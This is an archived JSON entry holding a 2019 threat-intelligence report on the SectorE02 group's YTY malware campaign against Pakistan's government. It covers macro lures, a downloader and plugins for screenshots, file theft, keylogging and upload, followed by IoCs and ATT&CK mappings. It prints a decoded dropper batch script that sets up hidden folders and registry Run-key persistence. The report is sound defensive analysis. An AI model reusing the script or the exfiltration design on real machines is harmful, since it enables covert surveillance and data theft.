# 0-raw-data/ORKL/library/jsons_entries/ed40c93c-d6ea-4b8d-b7eb-484cb741d850.json
{
    "id": "ed40c93c-d6ea-4b8d-b7eb-484cb741d850",
    "created_at": "2023-01-12T15:09:27.746918Z",
    "updated_at": "2025-03-27T02:09:44.478726Z",
    "deleted_at": null,
    "sha1_hash": "c1639995604e067d83c73579b92621db965d02b8",
    "title": "2019-08-02 - SectorE02 Updates YTY Framework in New Targeted Campaign Against Pakistan Government",
    "authors": "",
    "file_creation_date": "2022-05-28T22:00:21Z",
    "file_modification_date": "2022-05-28T22:00:21Z",
    "file_size": 1637801,
    "plain_text": "# SectorE02 Updates YTY Framework in New Targeted Campaign Against Pakistan Government\n\n**[threatrecon.nshc.net/2019/08/02/sectore02-updates-yty-framework-in-new-targeted-campaign-against-pakistan-government/](https://threatrecon.nshc.net/2019/08/02/sectore02-updates-yty-framework-in-new-targeted-campaign-against-pakistan-government/)**\n\n## Overview\n\nFrom March to July this year, the ThreatRecon team noticed a spear phishing campaign by the\nSectorE02 group going on against the Government of Pakistan and organizations there related to\ndefense and intelligence. Spear phishing emails are sent to their victims via Excel XLS files, which asks\ntheir victims to enable macros which will end up executing the downloader. Malicious document lures\nthey have employed in recent times include a document purporting to be for registration for the Pakistan\nAir Force.\n\nSecurity advisory by the Pakistan government regarding targeted attacks\n\nSectorE02 is a threat actor which targets countries in South Asia, especially Pakistan, since at least\n2012. Their arsenal includes a modular framework researchers have dubbed the “YTY Framework”,\nwhich has a Windows and mobile version. Usage of this framework allows the SectorE02 group to\n\n\n-----\n\nconstantly modify and even remake individual plugins of the framework, and pick and choose which\nplugins – if any – are sent to their victims. This modularity also allows the SectorE02 group to maintain\nlow detections by antivirus engines because each module only does something simple and will not even\nwork without certain previously dropped files. In this post, we will describe their lure document, first\nstage downloader, file plugin, screenshot plugin, keylogger plugin, and exfiltration uploader plugin.\n\n## Excel Spear Phishing\n\nThe excel file used by them had names such as Credit_Score.xls, Advance_Salary.xls,\nCSD_Schemes_2019.xls, and Agrani_Bank.xls. In some instances, it masqueraded as an Excel\ncalculator from the National Bank of Pakistan.\n\nLure document 1\n\nIn later stages of the campaign, however, the group appeared to switch to using a MsgBox to show an\nerror saying “This file is corrupted”.\n\n\n-----\n\nLure document 2\n\nAt the back, the excel macro would retrieve encoded data stored in itself, and the encoding here is just\na simple decimal encoding with a comma (or exclamation mark) as a separator. The same encoding is\nused for the dropped executable, although more often one entire file is encoded as a zip archive\ncontaining two files – a batch script and executable which is then unzipped and executed.\n\nAll four files here are illustration copied files from the original “.txt”, “.pdf”, and “.inp” files which are\nactually executable binaries\n\nExample Encoded Batch File in XLS Doc using Comma Separator\n```\n101,99,104,111,32,111,102,102,13,10,114,100,32,47,115,32,47,113,32,37,85,83,69,82,80,82,79,70,73\n\n```\nThe dropped batch scripts follow the same basic format: creating folders with the hidden, system, and\narchive attributes, dropping the batch and executable files there, and setting persistence through either\nscheduled tasks or the autorun registry key. A text file containing the %COMPUTERNAME% variable\nand random digits will also be saved as “win.txt”, and this file is required for the executable downloader.\n\n\n-----\n\nA dump showing the scheduled task created by the batch script\n\nThe batch file that is dropped is used for three main purposes: 1) to set up the first folder, which is used\nto store the text file containing the computer name, 2) to set up what we call the “common exfiltration\nfolder” which each individual plugin uses for different purposes, and 3) to set up persistence via\nscheduled task or registry run keys.\n\nExample Decoded Batch File in XLS Doc\n\n\n-----\n\n```\n/echo off\nrd /s /q %USERPROFILE%\\Printers\\Neighbourhood\\Spools\nrd /s /q %USERPROFILE%\\Print\\Network\\Server\nrd /s /q %USERPROFILE%\\DriveData\\Files\nrd /s /q %USERPROFILE%\\DriveData\\Wins\nmd %USERPROFILE%\\Printers\\Neighbourhood\\Spools\nmd %USERPROFILE%\\DriveData\\Files\nmd %USERPROFILE%\\DriveData\\Wins\nmd %USERPROFILE%\\Print\\Network\\Server\nattrib +a +h +s “%USERPROFILE%\\DriveData”\nattrib +a +h +s “%USERPROFILE%\\Printers”\nattrib +a +h +s “%USERPROFILE%\\Print”\nSET /A %COMPUTERNAME% \nSET /A RAND=%RANDOM% 10000 + 1 \necho %COMPUTERNAME%-%RAND% >> %USERPROFILE%\\DriveData\\Files\\win.txt\necho %COMPUTERNAME%-%RAND% >> %USERPROFILE%\\DriveData\\Wins\\win.txt\nreg delete “HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run” /v Files /f\nreg delete “HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run” /v Wins /f\nreg delete “HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run” /v BigSyn /f\nreg delete “HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run” /v Dataupdate /f\nreg add “HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run” /v Files /t REG_SZ /d\n%USERPROFILE%\\DriveData\\Wins\\juchek.exe\nreg add “HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run” /v Wins /t REG_SZ /d\n%USERPROFILE%\\DriveData\\Files\\svchots.exe\nreg add “HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run” /v BigSyn /t REG_SZ /d\n%USERPROFILE%\\DriveData\\Files\\lssms.exe\nreg add “HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run” /v BigUpdate /t REG_SZ /d\n%USERPROFILE%\\DriveData\\Files\\lssmp.exe\nreg add “HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run” /v Dataupdate /t REG_SZ /d\n%USERPROFILE%\\DriveData\\Files\\kylgr.exe\nmove %userprofile%\\AppData\\juchek.ttp %userprofile%\\DriveData\\Wins\nren %userprofile%\\DriveData\\Wins\\juchek.ttp juchek.exe\ndel %0\n\n## Downloader (b874a158f019dc082a0069eb3f7e169fbec2b4f05b123eed62d81776a7ddb384)\n\n```\nLooking at the latest downloader executable which masquerades its filename as an InPage word\ndocument (bgfRdstr54sf.inp), it starts off by using CreateEventA as a mutex with the value “ab567” and\nonly works if the file %USERPROFILE%\\DriveData\\Files\\win.txt exists. It polls the C2 server every 100\nor so seconds. It uses the fixed user agent string “Mozilla/5.0 (Windows NT 6.1; WOW64; rv:52.0)\nGecko/20100101 Firefox/52.0”, and performs a HTTPS GET against\nservicejobs[.]life/orderme/[computername]-[random].\n\nThis is a change from their previous URL structure, “/orderme”, which contained the file(s) to be\ndownloaded, and this allows them to cherry pick their victims – unless the SectorE02 operator\nspecifically places the next stage malware in the server directory for a particular victim, that victim will\nonly ever be infected with the downloader.\n\nThe downloader malware accepts three commands from the server, when the Content-Type response\nis “Content-Type: application”, “Content-Type: cmdline”, or “Content-Type: batcmd”, which are used for\nsaving files to disk or executing files/commands on the system. This is how the next stage downloader\nor plugins can be executed on the victim system.\n\n\n-----\n\n## Screenshot Plugin (f10f41bd38832596d4c449f81b9eb4129361aa4e4ebd4a8e8d2d8bf388934ca5)\n\nThis executable plugin takes a screenshot every two minutes using the Windows API to draw the raw\nscreen bitmap to the common exfiltration folder, %USERPROFILE%\\Print\\Network\\Server\\. It then\nconverts this raw bitmap to a JPG in a new file and deletes the raw bitmap file.\n\nCode in the screenshot plugin creating the raw bitmap\n\nThe screenshot files are named in the format of “tm_hour-tm_min-tm_sec-tm_year-tm_mday-tm_mon”\n\n[1].\n\n\n-----\n\nScreenshot JPGs created by the screenshot plugin\n\nLike some of the other YTY components, the obfuscated strings can be deobfuscated by running both\nthe base64 and reverse string algorithm multiple (in this case, three) times.\n\nThe strings can be deobfuscated by running both the base64 and reverse algorithm three times\n\n## File Listing Plugin (d71a1d993e9515ec69a32f913c2a18f14cdb52ef06e4011c8622b5945440c1aa)\n\nThis executable plugin recursively searches through the “C:”, “D:”, “E:”, “F:”, “G:”, and “H:” drives,\nlooking for interesting file extensions shown below. Several default folders are avoided by the malware.\n\nNote that the “.inp” extension is for “Urdu InPage”, a word processing program which supports\nlanguages such as Urdu which is the national language of Pakistan. The extensions the 2019 version of\nthis plugin did not previously look for are “.odt” and “.eml”, and “.rft” is just a spelling mistake they made\nof “.rtf”.\n\n\n-----\n\nThe latest version of the plugin looks for files with containing any of 14 different file extensions\n\nIt only looks for files modified later than year 2017 and saves the text data of all matching files found in\n%APPDATA%\\DriveData\\Files\\clist.log using the format of “File Path|Size WriteTimestamp l_flag”.\n\nFile path and names for exfiltration are saved to a clist.log file\n\nA copy of these matching files are also saved to the common exfiltration folder,\n%USERPROFILE%\\Print\\Network\\Server\\. The copied files are individually saved with the file names\nbeing the full file path to the copied file, with slashes becoming underscores.\n\nExact copies of files the plugin is looking for is saved to the common exfiltration folder\n\n## Keylogger Plugin (f331f67baa2650c426daae9dee6066029beb8b17253f26ad9ebbd3a64b2b6a37)\n\n\n-----\n\nThis plugin starts off by using CreateEventA as a mutex with the value k4351 . It saves user keystrokes\nand which window title those keystrokes were pressed in the common exfiltration folder,\n%USERPROFILE%\\Print\\Network\\Server\\. The file is saved as\n“[username]_YYYY_MM_DD(HH_mm_ss).txt”.\n\nExample of input captured by the keylogger plugin\n\n## Uploader Plugin (d4e587b16fbc486a62cc33febd5438be3a9690afc1650af702ed42d00ebfd39e)\n\nThis plugin starts off by using CreateEventA as a mutex with the value “MyEvent3525” and only works if\nthe file %USERPROFILE%\\DriveData\\Files\\win.txt exists . While the other plugins dump their files into\nthe common exfiltration folder, the uploader plugin takes the files from that folder and uploads it to the\nC2 server, which is the same server as the downloader C2 server. The uploaded files are deleted\nimmediately after.\n\nThe uploader performs a HTTP POST to /upload/[computername] of the file using HTTP forms with the\nsame hard coded user-agent as their downloader malware, “Mozilla/5.0 (Windows NT 6.1; WOW64;\nrv:52.0) Gecko/20100101 Firefox/52.0”.\n\n\n-----\n\nData sent to the C2 server through HTTPS for exfiltration\n\n## Summary\n\nWhile the use of a modular framework is not a new concept, we see that the SectorE02 group’s\ncontinuous remaking of their YTY framework plugins which serve the same purpose allows them to\nkeep detections by security tools at a minimum. Based on their campaigns and the plugins we have\nseen, we believe they may be recreating each plugin on a per-campaign basis, meaning that each\nattack campaign might be targeting with new binaries coded from scratch and be hardly detected by\nsecurity tools. At the same time, their newfound cautiousness in protecting their binaries from being\ndownloaded and limited targeting means that the hardest part of detecting and responding to the\nSectorE02 group may be finding their related binaries in the first place.\n\n## Indicators of Compromise (IoCs)\n\n\n-----\n\n**Malicious Excel Files (SHA-256)**\n1f64ab4db42ad68b4b99120ef6e9d1409cf606d31d932c0d306bb11c8ddcb2b4\n5a70d423fb336448fc7a71fbc3c7a4f0397bc7fa1ec32f7cc42824a432051c33\n95ea070bbfca04fff58a7092d61527aad0474914ffd2501d96991faad1388c7a\nfdcf3873df6f83336539c4997ce69fce459737c6d655f1972422f861437858a9\n6d0a3c4b2414c59be1190710c09330f4dd07e7badc4194e592799783f1cfd055\n7703c3385894dd3468c468745c747bf5c75f37a9b1fcaf2a1d0f291ecb7abce6\naa1c8adc4b7d352e487842b1d3017f627230ff1057350aaca1ffeb4d6abae16a\na06a5b1d63ca67da90ba6cd9cbc00d6872707a1b49d44de26d6eb5ce7dd7d545\ncc2c2694d0284153605a98c0e7493fb90aff0d78e7f03e37c80fb505fbf3f93f\n6d0a3c4b2414c59be1190710c09330f4dd07e7badc4194e592799783f1cfd055\n42775c20aa5b73b2eaecb5b107ce59d105f978660e6e43f53f804733ce3f7cbe\nf0c85a1c9cf80ad424acebbe7af54176d0cb778a639da2f2f59828af5bb79842\n\n**Dropped Batch Scripts (SHA-256)**\n92b12010772166647f510ad91731e931d58bc077bfc9f9d39adc678cc00fb65d\n1b46735d6b6aebefd5809274de1aaa56b5fac314b33c2fa51b001e07b4f7e4d7\n57a9a17baaf61de5cffa8b2e2ec340a179e7e1cd70e046cbd832655c44bc7c1d\ncd03ed9e4f3257836e11016294c8701baa12414b59f221e556cbed16a946b205\nce1df70e96b4780329d393ff7a37513aec222030e80606ee3ef99b306951d74d\n9169dab8579d49253f72439f7572e0aabeb685c5ca63bf91fff81502764e79bb\n\n**Dropped YTY Downloaders (SHA-256)**\n5acfd1b49ae86ef66b94a3e0209a2d2a3592c31b57ccbaa4bb9540fcf3403574\n08b11f246e2ebcfc049f198c055fc855e0af1f8499ba18791e3232efa913b01a\n62dfec7fe0025e8863c2252abb4ec1abdb4b916b76972910c6a47728bfb648a7\n13f27543d03fd4bee3267bdc37300e578994f55edabc031de936ff476482ceb4\nb874a158f019dc082a0069eb3f7e169fbec2b4f05b123eed62d81776a7ddb384\ne726c07f3422aaee45187bae9edb1772146ccac50315264b86820db77b42b31c\n\n**YTY File Plugin**\n8fff7f07ebf0a1e0a4eabdcf57744739f39de643d831c36416b663bd243590e1\nd71a1d993e9515ec69a32f913c2a18f14cdb52ef06e4011c8622b5945440c1aa\n\n**YTY Screenshot Plugin**\nf10f41bd38832596d4c449f81b9eb4129361aa4e4ebd4a8e8d2d8bf388934ca5\n\n**YTY Keylogger Plugin**\nf331f67baa2650c426daae9dee6066029beb8b17253f26ad9ebbd3a64b2b6a37\n\n**YTY File Exfiltration Uploader Plugin**\nd4e587b16fbc486a62cc33febd5438be3a9690afc1650af702ed42d00ebfd39e\n\n**IP Addresses**\n179[.]43[.]170[.]155\n5[.]135[.]199[.]26\n\n\n-----\n\n**Domains**\ndata-backup[.]online\nservicejobs[.]life\n\n## MITRE ATT&CK Techniques\n\nThe following is a list of MITRE ATT&CK Techniques we have observed based on our analysis of these\nmalware.\n\n**Initial Access**\n\nT1193 Spearphishing Attachment\n\n**Execution**\n\nT1059 Command-Line Interface\n\nT1053 Scheduled Task\n\nT1064 Scripting\n\nT1204 User Execution\n\n**Persistence**\n\nT1158 Hidden Files and Directories\n\nT1060 Registry Run Keys / Startup Folder\n\nT1053 Scheduled Task\n\n**Defense Evasion**\n\nT1140 Deobfuscate/Decode Files or Information\n\nT1107 File Deletion\n\nT1158 Hidden Files and Directories\n\nT1066 Indicator Removal from Tools\n\nT1112 Modify Registry\n\nT1027 Obfuscated Files or Information\n\nT1064 Scripting\n\n**Credential Access**\n\nT1056 Input Capture\n\n**Discovery**\n\nT1010 Application Window Discovery\n\nT1083 File and Directory Discovery\n\nT1082 System Information Discovery\n\nT1497 Virtualization/Sandbox Evasion\n\n**Collection**\n\nT1119 Automated Collection\n\nT1005 Data from Local System\n\nT1039 Data from Network Shared Drive\n\nT1025 Data from Removable Media\n\nT1074 Data Staged\n\n\n-----\n\nT1114 Email Collection\nT1056 Input Capture\nT1113 Screen Capture\n\n**Command and Control**\nT1043 Commonly Used Port\nT1071 Standard Application Layer Protocol\n\n**Exfiltration**\nT1020 Automated Exfiltration\nT1041 Exfiltration Over Command and Control Channel\n\n## References\n\n[1] Microsoft Docs | localtime, _localtime32, _localtime64\n\nhttps://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/localtime-localtime32-localtime64?\nview=vs-2019\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2019/2019-08-02 - SectorE02 Updates YTY Framework in New Targeted Campaign Against Pakistan Government.pdf"
    ],
    "report_names": [
        "2019-08-02 - SectorE02 Updates YTY Framework in New Targeted Campaign Against Pakistan Government.pdf"
    ],
    "threat_actors": [
        {
            "id": "2ac63ef4-a7b8-4a30-96ad-b30ccb2073fc",
            "created_at": "2022-10-25T16:07:23.546262Z",
            "updated_at": "2025-03-27T02:02:09.856624Z",
            "deleted_at": null,
            "main_name": "Donot Team",
            "aliases": [
                "APT-C-35",
                "SectorE02"
            ],
            "source_name": "ETDA:Donot Team",
            "tools": [
                "BackConfig",
                "EHDevel",
                "Jaca",
                "yty"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "cfdd350b-de30-4d29-bbee-28159f26c8c2",
            "created_at": "2023-01-06T13:46:38.433736Z",
            "updated_at": "2025-03-27T02:00:02.832565Z",
            "deleted_at": null,
            "main_name": "VICEROY TIGER",
            "aliases": [
                "OPERATION HANGOVER",
                "Donot Team",
                "APT-C-35",
                "SectorE02",
                "Orange Kala"
            ],
            "source_name": "MISPGALAXY:VICEROY TIGER",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536167,
    "ts_updated_at": 1743041384,
    "ts_creation_date": 1653775221,
    "ts_modification_date": 1653775221,
    "files": {
        "pdf": "https://archive.orkl.eu/c1639995604e067d83c73579b92621db965d02b8.pdf",
        "text": "https://archive.orkl.eu/c1639995604e067d83c73579b92621db965d02b8.txt",
        "img": "https://archive.orkl.eu/c1639995604e067d83c73579b92621db965d02b8.jpg"
    }
}